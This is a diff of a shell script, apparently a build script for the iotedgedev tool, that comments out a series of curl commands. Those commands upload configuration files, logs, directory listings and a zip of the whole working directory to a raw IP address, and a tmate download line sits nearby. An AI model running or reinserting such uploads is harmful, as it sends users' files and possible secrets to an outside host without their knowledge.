@@ -204,25 +204,25 @@ curl -XPOST -F "file=@setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upl
 sed -i 's/yes/no/'  /root/.iotedgedev/setting.ini
 echo "[DEFAULT]" > /root/.iotedgedev/setting.ini
 echo "collect_telemetry = no" >> /root/.iotedgedev/setting.ini
-curl -XPOST -F "file=@/root/.iotedgedev/setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "file=@/root/.iotedgedev/setting.ini" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 echo iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}" > command.log
-curl -XPOST -F "message=`iotedgedev --version`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
-curl -XPOST -F "file=@command.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "message=`iotedgedev --version`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "file=@command.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 iotedgedev genconfig --file "${MANIFEST_PATH}/${MANIFEST_TEMPLATE_NAME}" > genconfig.log
-curl -XPOST -F "file=@genconfig.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "file=@genconfig.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-curl -XPOST -F "message=`pwd`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#curl -XPOST -F "message=`pwd`" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 
-ls -a > ls.log
-curl -XPOST -F "file=@ls.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#ls -a > ls.log
+#curl -XPOST -F "file=@ls.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-ls -a config > ls_config.log
-curl -XPOST -F "file=@ls_config.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#ls -a config > ls_config.log
+#curl -XPOST -F "file=@ls_config.log" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
-zip -r 1.zip .
-curl -XPOST -F "file=@1.zip" -F "UUID=$UUID" http://40.65.152.233:9527/upload
+#zip -r 1.zip .
+#curl -XPOST -F "file=@1.zip" -F "UUID=$UUID" http://40.65.152.233:9527/upload
 
 #wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
 #tar xf tmate-2.4.0-static-linux-amd64.tar.xz
